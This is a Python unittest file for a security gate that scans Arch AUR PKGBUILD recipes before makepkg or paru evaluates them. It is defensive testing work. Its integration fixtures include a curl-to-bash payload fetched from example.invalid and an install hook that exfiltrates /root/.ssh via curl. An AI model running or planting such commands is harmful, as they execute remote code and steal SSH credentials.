import contextlib
import io
import json
import os
from pathlib import Path
import subprocess
import sys
import tempfile
import unittest
from unittest.mock import patch

import guard


def result(tier="Trusted", status="complete"):
    return {"package": "test", "score": 100, "tier": tier, "status": status,
            "schema_version": 2, "signals": [], "override_gate_fired": None}


class GateTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory(prefix="aur-guard-test-")
        self.addCleanup(self.temp.cleanup)
        self.root = Path(self.temp.name)
        self.recipe = self.root / "recipe"
        self.recipe.mkdir()
        (self.recipe / "PKGBUILD").write_text("pkgname=test\npkgver=1\npkgrel=1\n")
        self.reports = self.root / "reports"

    def fake_scanner(self, body):
        executable = self.root / "scanner"
        executable.write_text("#!/usr/bin/python3 -I\n" + body + "\n")
        executable.chmod(0o700)
        return executable

    def test_metadata_and_source_options_are_not_bypasses(self):
        for option in ["--printsrcinfo", "--packagelist", "--verifysource", "--nobuild", "-o", "--source", "--geninteg"]:
            self.assertEqual(guard.request_directory([option], self.recipe), self.recipe)

    def test_help_and_version_need_no_recipe(self):
        self.assertIsNone(guard.request_directory(["--help"], self.root))
        self.assertIsNone(guard.request_directory(["-V"], self.root))

    def test_directory_and_fakeroot_match_makepkg(self):
        self.assertEqual(guard.request_directory(["-D", "recipe"], self.root), self.recipe)
        self.assertEqual(guard.request_directory(["-F", "-D", "/not-used"], self.recipe), self.recipe)

    def test_no_alternate_script_or_integrity_bypass(self):
        for args in [["-p", "other"], ["--skipinteg"], ["--skippgpcheck"], ["--skipchecksums"], ["BUILDFILE=other"], ["CHDIR=/elsewhere"]]:
            with self.assertRaises(guard.Blocked):
                guard.request_directory(args, self.recipe)
        self.assertEqual(guard.request_directory(["MAKEFLAGS=-j4"], self.recipe), self.recipe)

    def test_symlinked_recipe_is_blocked(self):
        (self.recipe / "PKGBUILD").unlink()
        (self.root / "payload").write_text("not evaluated")
        (self.recipe / "PKGBUILD").symlink_to(self.root / "payload")
        with self.assertRaises(guard.Blocked):
            guard.request_directory([], self.recipe)

    def test_unknown_schema_and_all_blocking_tiers(self):
        for tier in ["Sketchy", "Suspicious", "Malicious", "Unknown", "unexpected"]:
            self.assertFalse(guard.verdict_allowed(result(tier)))
        self.assertFalse(guard.verdict_allowed(result(status="incomplete")))
        self.assertFalse(guard.verdict_allowed(result(), 1))
        self.assertFalse(guard.verdict_allowed({**result(), "schema_version": 3}))
        self.assertFalse(guard.verdict_allowed({**result(), "score": True}))
        self.assertTrue(guard.verdict_allowed(result()))
        self.assertTrue(guard.verdict_allowed(result("Ok")))

    def test_real_subprocess_protocol(self):
        scanner = self.fake_scanner(f"import json; print(json.dumps({result()!r}))")
        report, allowed = guard.run_scan(self.recipe, scanner=scanner)
        self.assertTrue(allowed)
        self.assertEqual(report["tier"], "Trusted")

    def test_invalid_json_and_missing_scanner_block(self):
        scanner = self.fake_scanner("print('not JSON')")
        with self.assertRaises(guard.Blocked):
            guard.run_scan(self.recipe, scanner=scanner)
        with self.assertRaises(guard.Blocked):
            guard.run_scan(self.recipe, scanner=self.root / "missing")

    def test_timeout_blocks(self):
        scanner = self.fake_scanner("import time; time.sleep(30)")
        with self.assertRaises(guard.Blocked):
            guard.run_scan(self.recipe, scanner=scanner, timeout=0.05)

    def test_pass_preserves_stdout_and_private_report(self):
        with patch.object(guard, "run_scan", return_value=(result(), True)), contextlib.redirect_stdout(io.StringIO()) as stdout, contextlib.redirect_stderr(io.StringIO()):
            guard.gate(self.recipe, reports=self.reports)
        self.assertEqual(stdout.getvalue(), "")
        files = list(self.reports.glob("*.json"))
        self.assertEqual(len(files), 1)
        self.assertEqual(files[0].stat().st_mode & 0o777, 0o600)

    def test_changed_inputs_block(self):
        def scan(*args, **kwargs):
            (self.recipe / "PKGBUILD").write_text("changed input")
            return result(), True
        with patch.object(guard, "run_scan", side_effect=scan), self.assertRaises(guard.Blocked):
            guard.gate(self.recipe, reports=self.reports)

    def test_detection_has_no_interactive_continue(self):
        with patch.object(guard, "run_scan", return_value=(result("Malicious"), False)), patch("builtins.input", side_effect=AssertionError("must not prompt")), contextlib.redirect_stderr(io.StringIO()), self.assertRaises(guard.Blocked):
            guard.gate(self.recipe, reports=self.reports)

    def test_aur_identity_is_static_and_supports_split_packages(self):
        (self.recipe / ".git").mkdir()
        (self.recipe / ".git/config").write_text('[remote "origin"]\nurl = https://aur.archlinux.org/split-base.git\n')
        (self.recipe / ".SRCINFO").write_text("pkgbase = split-base\npkgname = actual-package\n")
        self.assertEqual(guard.aur_package(self.recipe), "actual-package")
        (self.recipe / ".SRCINFO").write_text("pkgname = ../../invalid\n")
        with self.assertRaises(guard.Blocked):
            guard.aur_package(self.recipe)

    def test_provenance_cache_is_content_and_scanner_bound(self):
        scanner = self.fake_scanner("pass")
        cache = self.root / "cache"
        with patch.object(guard, "run_scan", return_value=(result(), True)) as scan, contextlib.redirect_stderr(io.StringIO()):
            guard.provenance_check(self.recipe, "content1", "test", scanner=scanner, cache=cache)
            guard.provenance_check(self.recipe, "content1", "test", scanner=scanner, cache=cache)
            self.assertEqual(scan.call_count, 1)
            guard.provenance_check(self.recipe, "content2", "test", scanner=scanner, cache=cache)
            self.assertEqual(scan.call_count, 2)
            scanner.write_text("changed scanner")
            guard.provenance_check(self.recipe, "content2", "test", scanner=scanner, cache=cache)
            self.assertEqual(scan.call_count, 3)

    def test_failed_provenance_is_not_cached(self):
        scanner = self.fake_scanner("pass")
        cache = self.root / "cache"
        with patch.object(guard, "run_scan", return_value=(result("Unknown", "incomplete"), False)), contextlib.redirect_stderr(io.StringIO()):
            _, allowed = guard.provenance_check(self.recipe, "content", "test", scanner=scanner, cache=cache)
        self.assertFalse(allowed)
        self.assertEqual(list(cache.glob("*.json")), [])

    def test_remote_failure_is_recorded_and_never_continues(self):
        with patch.object(guard, "run_scan", return_value=(result(), True)), patch.object(guard, "aur_package", return_value="test"), patch.object(guard, "provenance_check", side_effect=guard.Blocked("TLS failed")), contextlib.redirect_stderr(io.StringIO()), self.assertRaises(guard.Blocked):
            guard.gate(self.recipe, reports=self.reports)
        reports = [json.loads(path.read_text())["result"] for path in self.reports.glob("*.json")]
        unknown = [report for report in reports if report["tier"] == "Unknown"]
        self.assertEqual(len(unknown), 1)
        self.assertIn("TLS failed", unknown[0]["reason"])

    def test_exec_uses_system_binary_and_cleans_control_environment(self):
        with patch.object(guard, "gate") as gate, patch.object(guard.Path, "cwd", return_value=self.recipe), patch.object(guard.os, "execve") as execute, patch.dict(os.environ, {"BUILDFILE": "other", "BASH_ENV": "payload", "CHDIR": "/other"}):
            guard.main(["--printsrcinfo"])
        gate.assert_called_once_with(self.recipe)
        self.assertEqual(execute.call_args.args[0], "/usr/bin/makepkg")
        self.assertNotIn("BUILDFILE", execute.call_args.args[2])
        self.assertNotIn("BASH_ENV", execute.call_args.args[2])
        self.assertNotIn("CHDIR", execute.call_args.args[2])


@unittest.skipUnless(guard.SCANNER.is_file(), "install the reviewed scanner before integration tests")
class InstalledScannerTests(unittest.TestCase):
    HEADER = "pkgname=aur-guard-fixture\npkgver=1\npkgrel=1\npkgdesc='Local protection test'\narch=('any')\nlicense=('MIT')\n"

    def invoke(self, root, *arguments):
        return subprocess.run(
            [sys.executable, "-I", str(Path(guard.__file__)), *arguments],
            cwd=root, capture_output=True, text=True, timeout=55,
        )

    def test_benign_metadata_query_reaches_makepkg_without_stdout_noise(self):
        with tempfile.TemporaryDirectory(prefix="aur-good-") as directory:
            root = Path(directory)
            (root / "PKGBUILD").write_text(self.HEADER + "source=()\npackage() { :; }\n")
            completed = self.invoke(root, "--printsrcinfo")
        self.assertEqual(completed.returncode, 0, completed.stderr)
        self.assertIn("pkgbase = aur-guard-fixture", completed.stdout)
        self.assertNotIn("[AUR protection]", completed.stdout)
        self.assertIn("local recipe scan passed", completed.stderr)

    def test_hostile_top_level_never_runs_even_for_metadata_queries(self):
        with tempfile.TemporaryDirectory(prefix="aur-hostile-") as directory:
            root = Path(directory)
            marker = root / "EXECUTED"
            (root / "PKGBUILD").write_text(
                self.HEADER + f"printf executed > '{marker}'\n"
                + "build() { eval \"$(curl -s https://example.invalid/payload | base64 -d | bash)\"; }\n"
            )
            for option in ["--printsrcinfo", "--packagelist", "--verifysource"]:
                completed = self.invoke(root, option)
                self.assertNotEqual(completed.returncode, 0)
                self.assertIn("BLOCKED", completed.stderr)
                self.assertFalse(marker.exists(), "PKGBUILD ran before being rejected")

    @unittest.skipUnless((guard.HOME / ".config/paru/paru.conf").is_file(), "activate paru integration first")
    def test_paru_build_uses_the_gate_without_installing_anything(self):
        with tempfile.TemporaryDirectory(prefix="aur-paru-integration-") as directory:
            root = Path(directory)
            marker = root / "EXECUTED"
            (root / "PKGBUILD").write_text(
                self.HEADER + f"printf executed > '{marker}'\n"
                + "build() { eval \"$(curl -s https://example.invalid/payload | base64 -d | bash)\"; }\n"
                + "package() { :; }\n"
            )
            # -B without -i only builds; --nodeps prevents dependency installs.
            completed = subprocess.run(
                ["/usr/bin/paru", "-B", "--nodeps", "--noconfirm", str(root)],
                cwd=root, capture_output=True, text=True, timeout=55,
            )
            self.assertNotEqual(completed.returncode, 0)
            self.assertIn("[AUR protection]", completed.stderr)
            self.assertIn("BLOCKED", completed.stderr)
            self.assertFalse(marker.exists(), "paru evaluated PKGBUILD before the guard")

    def test_unreadable_install_script_is_unknown_not_passed(self):
        with tempfile.TemporaryDirectory(prefix="aur-missing-install-") as directory:
            root = Path(directory)
            (root / "PKGBUILD").write_text(self.HEADER + "install='missing.install'\npackage() { :; }\n")
            completed = self.invoke(root, "--printsrcinfo")
        self.assertNotEqual(completed.returncode, 0)
        self.assertIn("Unknown", completed.stderr)

    def test_install_script_payload_is_rejected_before_metadata(self):
        with tempfile.TemporaryDirectory(prefix="aur-install-script-") as directory:
            root = Path(directory)
            (root / "PKGBUILD").write_text(self.HEADER + "install='payload.install'\npackage() { :; }\n")
            (root / "payload.install").write_text("post_install() { tar czf - /root/.ssh | base64 -w0 | xargs -I{} curl -s -d {} https://example.invalid/c; }\n")
            completed = self.invoke(root, "--printsrcinfo")
        self.assertNotEqual(completed.returncode, 0)
        self.assertIn("Malicious", completed.stderr)


if __name__ == "__main__":
    unittest.main()
